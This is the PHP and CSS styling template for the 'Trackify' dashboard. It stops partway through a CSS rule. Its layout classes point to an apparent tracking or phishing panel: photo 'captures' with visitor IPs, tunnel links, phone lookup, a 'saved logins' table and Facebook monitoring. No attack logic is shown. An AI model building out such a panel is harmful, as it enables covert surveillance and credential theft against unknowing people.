<?php
declare(strict_types=1);

if (!defined('TRACKIFY_PANEL')) {
    http_response_code(403);
    header('Content-Type: text/plain; charset=UTF-8');
    echo 'Forbidden';
    exit;
}

$userNavName = $userNavName ?? 'Account';
$userNavInitial = $userNavInitial ?? '?';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trackify - Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #0d1117;
            --bg-card: #161b22;
            --bg-input: #21262d;
            --border: #30363d;
            --text: #e6edf3;
            --text-muted: #8b949e;
            --accent: #58a6ff;
            --accent-green: #3fb950;
            --accent-yellow: #d29922;
            --accent-red: #f85149;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Space Grotesk', sans-serif;
            background: var(--bg-dark);
            color: var(--text);
            min-height: 100vh;
            background-image: radial-gradient(ellipse at top, #1a2332 0%, #0d1117 70%);
        }
        .layout {
            display: grid;
            grid-template-columns: minmax(380px, 1fr) minmax(460px, 580px) 360px;
            min-height: auto;
            align-content: start;
        }
        @media (max-width: 1200px) {
            .layout { grid-template-columns: 1fr 360px; }
            .gallery-section { order: 3; grid-column: 1 / -1; }
        }
        @media (max-width: 900px) {
            .layout { grid-template-columns: 1fr; }
        }
        .main {
            padding: 24px 28px 28px;
            overflow-y: auto;
        }
        .gallery-section {
            background: var(--bg-card);
            border-left: 1px solid var(--border);
            padding: 20px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
        }
        @media (max-width: 1200px) {
            .gallery-section { border-left: none; border-top: 1px solid var(--border); }
        }
        .sidebar {
            background: var(--bg-card);
            border-left: 1px solid var(--border);
            padding: 24px;
            overflow-y: auto;
        }
        @media (max-width: 900px) {
            .sidebar { border-left: none; border-top: 1px solid var(--border); }
        }
        .gallery-section .card.gallery-panel-head {
            display: flex;
            flex-direction: column;
            align-items: stretch;
            gap: 10px;
            margin-bottom: 18px;
        }
        .gallery-header-top {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            flex-wrap: wrap;
        }
        .gallery-toolbar {
            display: none;
            align-items: center;
            gap: 14px;
            flex-wrap: wrap;
        }
        .gallery-toolbar-label {
            font-size: 13px;
            color: var(--text-muted);
            display: inline-flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            user-select: none;
        }
        .gallery-btn {
            font-size: 12px;
            padding: 6px 12px;
            border-radius: 6px;
            border: 1px solid var(--border);
            background: var(--bg-input);
            color: var(--text);
            cursor: pointer;
            font-family: inherit;
        }
        .gallery-btn:disabled {
            opacity: 0.45;
            cursor: not-allowed;
        }
        .gallery-btn.danger {
            border-color: var(--accent-red);
            color: var(--accent-red);
        }
        .gallery-btn.danger:not(:disabled):hover {
            background: rgba(248,81,73,0.12);
        }
        .gallery-title {
            font-size: 18px;
            font-weight: 600;
            color: var(--text);
        }
        .gallery-stats {
            display: flex;
            align-items: center;
            gap: 12px;
            flex-wrap: wrap;
        }
        .gallery-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
            gap: 12px;
            align-self: start;
            width: 100%;
        }
        .gallery-item {
            position: relative;
            width: 100%;
            aspect-ratio: 1;
            border-radius: 8px;
            overflow: hidden;
            background: var(--bg-input);
            border: 1px solid var(--border);
            transition: all 0.2s ease;
            cursor: pointer;
        }
        .gallery-item:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0,0,0,0.3);
            border-color: var(--accent);
        }
        .gallery-item:focus {
            outline: 2px solid var(--accent);
            outline-offset: 2px;
        }
        .gallery-item img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
            pointer-events: none;
            user-select: none;
        }
        .gallery-item-overlay {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 4px 6px;
            background: linear-gradient(transparent, rgba(0,0,0,0.85));
            color: rgba(255,255,255,0.9);
            font-size: 9px;
            font-family: 'JetBrains Mono', monospace;
        }
        .gallery-item-actions {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            padding: 4px;
            display: flex;
            align-items: flex-start;
            justify-content: space-between;
            z-index: 3;
            pointer-events: none;
        }
        .gallery-item-actions > * {
            pointer-events: auto;
        }
        .gallery-select-cb {
            width: 16px;
            height: 16px;
            cursor: pointer;
            accent-color: var(--accent);
        }
        .gallery-delete-one {
            width: 26px;
            height: 26px;
            border: none;
            border-radius: 6px;
            background: rgba(248,81,73,0.92);
            color: #fff;
            font-size: 16px;
            line-height: 1;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: inherit;
            padding: 0;
        }
        .gallery-delete-one:hover {
            background: var(--accent-red);
        }
        .gallery-select-label {
            margin: 0;
            padding: 2px;
            background: rgba(0,0,0,0.35);
            border-radius: 4px;
        }
        .capture-quota-banner {
            font-size: 13px;
            line-height: 1.45;
            padding: 10px 12px;
            border-radius: 8px;
            border: 1px solid rgba(210,153,34,0.45);
            background: rgba(210,153,34,0.12);
            color: var(--accent-yellow);
        }
        .gallery-empty {
            grid-column: 1 / -1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 24px;
            text-align: center;
        }
        .gallery-empty-icon {
            width: 80px;
            height: 80px;
            margin-bottom: 24px;
            background: linear-gradient(135deg, rgba(88,166,255,0.2), rgba(163,113,247,0.2));
            border: 2px dashed rgba(88,166,255,0.4);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            animation: pulse-glow 3s ease-in-out infinite;
        }
        @keyframes pulse-glow {
            0%, 100% { opacity: 1; transform: scale(1); border-color: rgba(88,166,255,0.4); }
            50% { opacity: 0.9; transform: scale(1.03); border-color: rgba(163,113,247,0.5); }
        }
        .gallery-empty-title {
            font-size: 16px;
            font-weight: 600;
            color: var(--text);
            margin-bottom: 8px;
        }
        .gallery-empty-text {
            color: var(--text-muted);
            font-size: 13px;
            max-width: 280px;
            line-height: 1.5;
        }
        .gallery-empty-hint {
            margin-top: 16px;
            font-size: 12px;
            color: var(--text-muted);
            opacity: 0.8;
        }
        .pagination {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 24px;
            padding-top: 20px;
            border-top: 1px solid var(--border);
            width: 100%;
        }
        .pagination-btn {
            min-width: 40px;
            height: 40px;
            padding: 0 12px;
            border: 1px solid var(--border);
            background: var(--bg-input);
            color: var(--text);
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }
        .pagination-btn:hover:not(:disabled) {
            border-color: var(--accent);
            background: rgba(88,166,255,0.1);
        }
        .pagination-btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }
        .pagination-info {
            font-size: 13px;
            color: var(--text-muted);
            padding: 0 16px;
        }
        .lightbox {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.9);
            z-index: 2000;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s;
        }
        .lightbox.show {
            opacity: 1;
            visibility: visible;
        }
        .lightbox img {
            max-width: 100%;
            max-height: 90vh;
            object-fit: contain;
            border-radius: 8px;
        }
        .lightbox-close {
            position: absolute;
            top: 24px;
            right: 24px;
            width: 44px;
            height: 44px;
            border: none;
            background: rgba(255,255,255,0.1);
            color: white;
            border-radius: 50%;
            font-size: 24px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .lightbox-close:hover {
            background: rgba(255,255,255,0.2);
        }
        .title-row {
            display: flex;
            align-items: flex-start;
            justify-content: space-between;
            gap: 16px;
            flex-wrap: wrap;
            margin-bottom: 8px;
        }
        .title-row h1 {
            margin-bottom: 0;
        }
        .user-nav {
            position: relative;
            flex-shrink: 0;
            z-index: 200;
        }
        .user-nav-trigger {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            font-weight: 600;
            font-family: inherit;
            color: var(--text);
            padding: 0;
            border-radius: 999px;
            border: none;
            background: transparent;
            cursor: pointer;
        }
        .user-nav-trigger:hover {
            color: #fff;
        }
        .user-nav-trigger[aria-expanded="true"] {
            border-color: var(--accent);
        }
        .user-nav-trigger[aria-expanded="true"] .user-nav-chevron {
            transform: rotate(180deg);
        }
        .user-nav-avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: linear-gradient(135deg, #58a6ff, #a371f7);
            color: #fff;
            font-size: 14px;
            font-weight: 700;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        .user-nav-name {
            max-width: 160px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        @media (max-width: 600px) {
            .user-nav-name { max-width: 100px; }
        }
        .user-nav-chevron {
            color: var(--text-muted);
            flex-shrink: 0;
            transition: transform 0.2s;
        }
        .user-nav-dropdown {
            position: absolute;
            top: calc(100% + 8px);
            right: 0;
            min-width: 212px;
            padding: 6px;
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 10px;
            box-shadow: 0 16px 40px rgba(0,0,0,0.45);
        }
        .user-nav-dropdown[hidden] {
            display: none !important;
        }
        .user-nav-item {
            display: block;
            padding: 10px 12px;
            border-radius: 8px;
            font-size: 13px;
            font-weight: 500;
            color: var(--text);
            text-decoration: none;
            transition: background 0.15s;
        }
        .user-nav-item:hover {
            background: var(--bg-input);
        }
        .user-nav-item--danger {
            color: var(--accent-red);
        }
        .user-nav-item--danger:hover {
            background: rgba(248, 81, 73, 0.1);
        }
        h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
            background: linear-gradient(135deg, #58a6ff, #a371f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .subtitle {
            color: var(--text-muted);
            font-size: 14px;
            margin-bottom: 20px;
            line-height: 1.55;
            max-width: 48rem;
        }
        .card > .subtitle.card-view-desc {
            margin-top: 8px;
            margin-bottom: 18px;
            max-width: none;
        }
        .card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 24px;
        }
        .layout .card {
            padding: 20px;
            margin-bottom: 18px;
        }
        .card h2 {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 16px;
            color: var(--text);
        }
        label {
            display: block;
            font-size: 13px;
            color: var(--text-muted);
            margin-bottom: 8px;
        }
        select,
        input[type="text"],
        input[type="password"],
        input[type="url"],
        input[type="email"],
        input[type="search"] {
            width: 100%;
            padding: 12px 16px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text);
            font-size: 14px;
            font-family: inherit;
            margin-bottom: 16px;
        }
        select:focus,
        input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 1px rgba(88, 166, 255, 0.2);
        }
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            height: 44px;
            padding: 0 24px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            transition: all 0.2s;
            box-sizing: border-box;
        }
        .btn-primary {
            background: linear-gradient(135deg, #238636, #2ea043);
            color: white;
        }
        .btn-primary:hover {
            filter: brightness(1.1);
            transform: translateY(-1px);
        }
        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .btn-generate {
            width: 100%;
            margin-top: 20px;
            min-height: 50px;
            padding: 0 28px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            letter-spacing: 0.02em;
            box-shadow: 0 2px 14px rgba(35, 134, 54, 0.32);
        }
        .btn-generate:hover:not(:disabled) {
            box-shadow: 0 4px 20px rgba(35, 134, 54, 0.42);
        }
        .btn-generate:active:not(:disabled) {
            transform: translateY(0);
            filter: brightness(0.98);
        }
        .btn-generate-icon {
            flex-shrink: 0;
            opacity: 0.95;
        }
        .btn-secondary {
            background: var(--bg-input);
            color: var(--text);
            border: 1px solid var(--border);
        }
        .btn-secondary:hover {
            background: var(--border);
        }
        .link-box {
            display: flex;
            align-items: stretch;
            gap: 12px;
            margin-top: 16px;
        }
        .tunnel-controls-wrap {
            margin-top: 16px;
        }
        .tunnel-controls-wrap .link-box {
            margin-top: 0;
            width: 100%;
        }
        .tunnel-link-group {
            display: flex;
            flex: 1;
            min-width: 0;
            gap: 12px;
            align-items: stretch;
        }
        .link-box.link-box--stop-only .tunnel-link-group {
            display: none;
        }
        .link-box.link-box--stop-only {
            justify-content: flex-end;
        }
        .link-box .btn {
            height: 44px;
            min-width: 44px;
            padding: 0 16px;
        }
        .link-input {
            flex: 1;
            height: 44px;
            padding: 0 16px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--accent);
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            box-sizing: border-box;
        }
        .terminal-cursor {
            display: inline-block;
            width: 8px;
            height: 16px;
            background: var(--accent);
            animation: blink 1s step-end infinite;
            vertical-align: -2px;
        }
        @keyframes blink {
            50% { opacity: 0; }
        }
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 500;
        }
        .status-badge.active {
            background: rgba(63, 185, 80, 0.2);
            color: var(--accent-green);
        }
        .status-badge.inactive {
            background: rgba(248, 81, 73, 0.2);
            color: var(--accent-red);
        }
        .status-badge::before {
            content: '';
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: currentColor;
        }
        .status-badge.inactive::before { background: var(--accent-red); }
        .btn-danger {
            background: rgba(248, 81, 73, 0.2);
            color: var(--accent-red);
            border: 1px solid var(--accent-red);
        }
        .btn-danger:hover {
            background: rgba(248, 81, 73, 0.3);
        }
        .captures-list {
            max-height: 200px;
            overflow-y: auto;
        }
        .capture-item {
            padding: 12px;
            background: var(--bg-input);
            border-radius: 8px;
            margin-bottom: 8px;
            font-size: 13px;
        }
        .capture-item .ip { color: var(--accent); font-weight: 500; }
        .capture-item .time { color: var(--text-muted); font-size: 12px; }
        .empty-state {
            color: var(--text-muted);
            text-align: center;
            padding: 32px;
            font-size: 14px;
        }
        .card-header-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
            margin-bottom: 12px;
        }
        .card-header-row h2 {
            margin-bottom: 0;
        }
        .mini-btn {
            height: 30px;
            padding: 0 12px;
            border-radius: 8px;
            border: 1px solid var(--border);
            background: var(--bg-input);
            color: var(--text-muted);
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            font-family: inherit;
        }
        .mini-btn:hover {
            color: var(--text);
            border-color: var(--accent);
        }
        .toast {
            position: fixed;
            top: 18px;
            left: 50%;
            padding: 12px 20px;
            background: var(--accent-green);
            color: white;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            transform: translate(-50%, -12px);
            opacity: 0;
            transition: all 0.3s;
            z-index: 1000;
            max-width: min(640px, calc(100vw - 28px));
            text-align: center;
        }
        .toast.show {
            transform: translate(-50%, 0);
            opacity: 1;
        }
        .side-nav-spacer {
            flex: 1;
            min-height: 8px;
        }
        .side-nav-disclaimer-wrap {
            width: 100%;
            display: block;
            flex-shrink: 0;
            margin-top: 4px;
            padding-top: 8px;
            border-top: 1px solid rgba(48, 54, 61, 0.5);
        }
        .side-nav-item-icon svg:not(.side-nav-fb-logo) {
            display: block;
            width: 18px;
            height: 18px;
            flex-shrink: 0;
        }
        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.7);
            z-index: 3000;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s;
        }
        .modal-overlay.show {
            opacity: 1;
            visibility: visible;
        }
        .modal-content {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            max-width: 480px;
            width: 100%;
            max-height: 80vh;
            overflow-y: auto;
            padding: 24px;
            transform: scale(0.95);
            transition: transform 0.3s;
        }
        .modal-overlay.show .modal-content {
            transform: scale(1);
        }
        .modal-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 16px;
            color: var(--text);
        }
        .modal-body {
            font-size: 14px;
            line-height: 1.6;
            color: var(--text-muted);
            margin-bottom: 24px;
        }
        .modal-body p {
            margin-bottom: 12px;
        }
        .modal-close {
            width: 100%;
            padding: 12px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text);
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .modal-close:hover {
            background: var(--border);
        }
        .support-float {
            position: fixed;
            right: 20px;
            bottom: 20px;
            z-index: 2600;
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            gap: 10px;
        }
        .support-prompt {
            max-width: 280px;
            padding: 12px 14px;
            border-radius: 10px;
            border: 1px solid rgba(88, 166, 255, 0.35);
            background: rgba(13, 17, 23, 0.96);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.35);
            font-size: 13px;
            line-height: 1.45;
            color: var(--text);
        }
        .support-prompt[hidden] {
            display: none !important;
        }
        .support-prompt-actions {
            margin-top: 10px;
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        .support-link-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            height: 34px;
            padding: 0 12px;
            border-radius: 999px;
            border: 1px solid rgba(255, 221, 87, 0.45);
            background: linear-gradient(135deg, #ffdd57, #ffbf00);
            color: #121212;
            font-size: 12px;
            font-weight: 700;
            text-decoration: none;
        }
        .support-link-btn:hover {
            filter: brightness(1.05);
        }
        .support-dismiss-btn {
            height: 34px;
            padding: 0 12px;
            border-radius: 999px;
            border: 1px solid var(--border);
            background: var(--bg-input);
            color: var(--text-muted);
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            font-family: inherit;
        }
        .support-dismiss-btn:hover {
            color: var(--text);
            border-color: var(--accent);
        }
        .support-fab {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            height: 48px;
            padding: 0 16px;
            border: none;
            border-radius: 999px;
            background: linear-gradient(135deg, #ffdd57, #ffbf00);
            color: #111;
            font-size: 13px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 12px 24px rgba(0,0,0,0.35);
            text-decoration: none;
            transition: transform 0.18s ease, filter 0.18s ease;
        }
        .support-fab:hover {
            transform: translateY(-1px);
            filter: brightness(1.04);
        }
        @media (max-width: 680px) {
            .support-float {
                right: 12px;
                bottom: 12px;
            }
            .support-prompt {
                max-width: min(280px, calc(100vw - 24px));
            }
            .support-fab {
                font-size: 12px;
                padding: 0 14px;
            }
        }
        .phone-lookup-input-wrap {
            display: flex;
            flex-direction: column;
            gap: 8px;
            margin-bottom: 12px;
        }
        .phone-lookup-error {
            margin-top: -4px;
            margin-bottom: 10px;
            font-size: 12px;
            color: var(--accent-red);
        }
        .phone-lookup-error[hidden] {
            display: none !important;
        }
        .phone-lookup-actions {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            align-items: center;
            margin-top: 4px;
        }
        .phone-lookup-results {
            margin-top: 12px;
            font-size: 13px;
        }
        .phone-lookup-terminal {
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            line-height: 1.6;
            background: #05070c;
            border-radius: 10px;
            border: 1px solid var(--border);
            padding: 16px 18px;
            max-height: 340px;
            overflow-y: auto;
            color: #b3b1ad;
        }
        .phone-lookup-terminal-line {
            margin-bottom: 4px;
            word-break: break-all;
        }
        .phone-lookup-terminal-line span.prompt {
            color: #ff8f40;
        }
        .phone-lookup-terminal-line span.link {
            color: #39bae6;
        }
        .phone-lookup-terminal-line span.hint {
            color: #626a73;
        }
        .phone-lookup-terminal-line.green { color: #7fd962; }
        .phone-lookup-terminal-line.cyan { color: #39bae6; }
        .phone-lookup-terminal-line.yellow { color: #ffb454; }
        .phone-lookup-terminal-line.dim { color: #626a73; }
        .phone-lookup-hint {
            color: var(--text-muted);
            font-size: 12px;
        }
        .app-shell {
            display: flex;
            min-height: 100vh;
        }
        .side-nav {
            width: 228px;
            min-height: 100vh;
            background: linear-gradient(180deg, #060910 0%, #05070c 100%);
            border-right: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            align-items: stretch;
            padding: 16px 12px 20px;
            gap: 4px;
            box-sizing: border-box;
            flex-shrink: 0;
        }
        .side-nav-brand {
            display: flex;
            align-items: center;
            gap: 10px;
            width: 100%;
            margin-bottom: 14px;
            padding: 4px 6px 12px;
            border-bottom: 1px solid rgba(48, 54, 61, 0.65);
        }
        .side-nav-logo {
            width: 44px;
            height: 44px;
            padding: 0;
            border: none;
            border-radius: 10px;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            overflow: hidden;
            flex-shrink: 0;
        }
        .side-nav-logo img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            object-position: 12% center;
            display: block;
        }
        .side-nav-logo:focus-visible {
            outline: 2px solid var(--accent);
            outline-offset: 2px;
        }
        .side-nav-product {
            font-size: 16px;
            font-weight: 700;
            color: var(--text);
            letter-spacing: -0.03em;
            line-height: 1.2;
            min-width: 0;
        }
        .side-nav-section-label {
            font-size: 10px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            color: #6e7681;
            padding: 10px 10px 6px;
            margin-top: 4px;
        }
        .top-nav-brand {
            display: inline-flex;
            align-items: center;
            padding: 0;
            border: none;
            background: none;
            cursor: pointer;
            line-height: 0;
            margin: 0;
            font: inherit;
        }
        .top-nav-brand img {
            height: 34px;
            width: auto;
            max-width: min(220px, 46vw);
            display: block;
            object-fit: contain;
        }
        .top-nav-brand:focus-visible {
            outline: 2px solid var(--accent);
            outline-offset: 4px;
            border-radius: 8px;
        }
        .side-nav-item {
            width: 100%;
            min-height: 42px;
            padding: 8px 10px;
            border-radius: 10px;
            border: none;
            background: transparent;
            display: flex;
            align-items: center;
            justify-content: flex-start;
            gap: 12px;
            color: var(--text-muted);
            cursor: pointer;
            transition: background 0.15s, color 0.15s;
            font-size: 18px;
            text-decoration: none;
            font-family: inherit;
            box-sizing: border-box;
            text-align: left;
        }
        .side-nav-item-icon {
            width: 26px;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 17px;
            line-height: 1;
        }
        .side-nav-item-label {
            font-size: 13px;
            font-weight: 500;
            line-height: 1.25;
            flex: 1;
            min-width: 0;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            color: inherit;
        }
        .side-nav-item:hover {
            color: var(--text);
            background: rgba(88, 166, 255, 0.1);
        }
        .side-nav-item.active {
            background: rgba(22, 27, 34, 0.95);
            color: var(--accent);
            box-shadow: inset 0 0 0 1px rgba(88, 166, 255, 0.18);
        }
        .side-nav-item.active .side-nav-item-label {
            font-weight: 600;
        }
        .side-nav-group {
            display: flex;
            flex-direction: column;
            gap: 2px;
            width: 100%;
        }
        .side-nav-group-toggle {
            width: 100%;
            min-height: 42px;
            padding: 8px 10px;
            border-radius: 10px;
            border: none;
            background: transparent;
            display: flex;
            align-items: center;
            justify-content: flex-start;
            gap: 10px;
            color: var(--text-muted);
            cursor: pointer;
            transition: background 0.15s, color 0.15s;
            font-size: 18px;
            font-family: inherit;
            box-sizing: border-box;
            text-align: left;
        }
        .side-nav-group-toggle:hover {
            color: var(--text);
            background: rgba(88, 166, 255, 0.08);
        }
        .side-nav-group-toggle .side-nav-item-label {
            flex: 1;
            min-width: 0;
        }
        .side-nav-group.has-active-child .side-nav-group-toggle {
            color: var(--text);
        }
        .side-nav-item-icon--fb {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .side-nav-fb-logo {
            display: block;
            flex-shrink: 0;
        }
        .side-nav-group-chevron {
            margin-left: auto;
            font-size: 10px;
            line-height: 1;
            opacity: 0.7;
            transition: transform 0.15s ease;
        }
        .side-nav-group.is-collapsed .side-nav-group-chevron {
            transform: rotate(-90deg);
        }
        .side-nav-submenu {
            display: flex;
            flex-direction: column;
            gap: 2px;
            padding: 2px 0 6px 0;
            margin: 0 0 2px 10px;
            padding-left: 12px;
            border-left: 1px solid rgba(88, 166, 255, 0.14);
        }
        .side-nav-group.is-collapsed .side-nav-submenu {
            display: none;
        }
        .side-nav-item.side-nav-item--sub {
            padding-left: 12px;
        }
        .side-nav-item.side-nav-item--sub .side-nav-item-icon {
            width: 22px;
            font-size: 15px;
        }
        .phone-layout {
            flex: 1;
            display: none;
            padding: 40px;
            overflow-y: auto;
        }
        .terminal-card-head {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            flex-wrap: wrap;
            margin-bottom: 12px;
        }
        .terminal-card-head h2 {
            margin-bottom: 0;
        }
        .terminal-card-badge {
            font-size: 11px;
            font-family: 'JetBrains Mono', monospace;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.07em;
            color: var(--accent-green);
            background: rgba(63, 185, 80, 0.12);
            border: 1px solid rgba(63, 185, 80, 0.35);
            padding: 4px 10px;
            border-radius: 999px;
        }
        .terminal-card-badge--saveinfo {
            color: #39bae6;
            background: rgba(57, 186, 230, 0.1);
            border-color: rgba(57, 186, 230, 0.35);
        }
        .card-terminal-panel .phone-lookup-terminal {
            max-height: min(480px, 52vh);
            background: linear-gradient(180deg, #070a10 0%, #05070c 100%);
            box-shadow: inset 0 0 0 1px rgba(88, 166, 255, 0.07);
        }
        .save-info-stack {
            display: flex;
            flex-direction: column;
            gap: 20px;
            min-width: 0;
        }
        .saved-info-wrap {
            margin-top: 0;
        }
        .saved-logins-card .saved-logins-card-head {
            display: flex;
            align-items: baseline;
            justify-content: space-between;
            gap: 12px;
            flex-wrap: wrap;
            margin-bottom: 8px;
        }
        .saved-logins-card .saved-logins-card-head h2 {
            margin-bottom: 0;
        }
        .saved-logins-count {
            font-size: 12px;
            color: var(--text-muted);
            font-family: 'JetBrains Mono', monospace;
        }
        .saved-logins-intro {
            margin: 0 0 14px;
            font-size: 13px;
            line-height: 1.5;
        }
        .saved-logins-toolbar {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 14px;
        }
        .saved-logins-toolbar .btn {
            flex: 1 1 auto;
            min-width: 120px;
            justify-content: center;
        }
        .saved-info-table-scroll {
            max-height: min(520px, 55vh);
            overflow: auto;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
            border: 1px solid var(--border);
            border-radius: 10px;
            background: var(--bg-dark);
        }
        .saved-info-table {
            width: max-content;
            min-width: 100%;
            border-collapse: separate;
            border-spacing: 0;
            font-size: 13px;
            table-layout: auto;
        }
        .saved-info-table th,
        .saved-info-table td {
            text-align: left;
            padding: 12px 16px;
            border-bottom: 1px solid var(--border);
            vertical-align: middle;
            word-break: normal;
            overflow-wrap: anywhere;
        }
        .saved-info-table tbody tr:last-child td {
            border-bottom: none;
        }
        .saved-info-table th {
            position: sticky;
            top: 0;
            z-index: 2;
            color: var(--text-muted);
            font-weight: 600;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            background: #121820;
            box-shadow: 0 1px 0 var(--border);
        }
        .saved-info-table tbody tr:nth-child(even) td {
            background: rgba(255, 255, 255, 0.02);
        }
        .saved-info-table tbody tr:hover td {
            background: rgba(88, 166, 255, 0.08);
        }
        /* Facebook Monitor — admin-style layout (full width) */
        #fbmonitorLayout.phone-layout {
            width: 100%;
            max-width: none;
            align-self: stretch;
            box-sizing: border-box;
            padding: 40px 24px;
        }
        #fbmonitorLayout .phone-layout-inner {
            max-width: none;
            width: 100%;
            margin: 0;
        }
        /* Must beat `.phone-layout-columns` (same specificity); otherwise two columns + empty track */
        #fbmonitorLayout .phone-layout-columns--fbmonitor {
            grid-template-columns: minmax(0, 1fr);
            width: 100%;
            max-width: none;
            margin: 0;
        }
        .fb-monitor-card {
            padding: 22px 24px 26px;
            width: 100%;
            box-sizing: border-box;
        }
        .fb-monitor-page-head {
            display: flex;
            align-items: flex-start;
            justify-content: space-between;
            gap: 16px;
            flex-wrap: wrap;
            margin-bottom: 8px;
        }
        .fb-monitor-page-head h2 {
            margin-bottom: 6px;
        }
        .fb-monitor-page-actions {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-shrink: 0;
        }
        .fb-monitor-btn-add {
            background: var(--accent);
            color: #0d1117;
            border: none;
            font-weight: 600;
            padding: 10px 18px;
            border-radius: 8px;
            cursor: pointer;
            font-family: inherit;
            font-size: 14px;
            box-shadow: 0 1px 0 rgba(255,255,255,0.06) inset;
        }
        .fb-monitor-btn-add:hover {
            filter: brightness(1.08);
        }
        .fb-monitor-search-card {
            margin-top: 18px;
            padding: 16px 18px;
            background: var(--bg-dark);
            border: 1px solid var(--border);
            border-radius: 10px;
        }
        .fb-monitor-search-label {
            display: block;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.06em;
            color: var(--text-muted);
            margin-bottom: 10px;
        }
        .fb-monitor-search-row {
            display: grid;
            grid-template-columns: minmax(0, 1fr) auto;
            gap: 10px;
            align-items: stretch;
            width: 100%;
            max-width: min(36rem, 100%);
        }
        .fb-monitor-search-actions {
            display: inline-flex;
            align-items: stretch;
            gap: 10px;
        }
        .fb-monitor-bulk-delete-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin: 0;
            padding: 0 14px;
            height: 42px;
            min-height: 42px;
            max-height: 42px;
            box-sizing: border-box;
            border-radius: 8px;
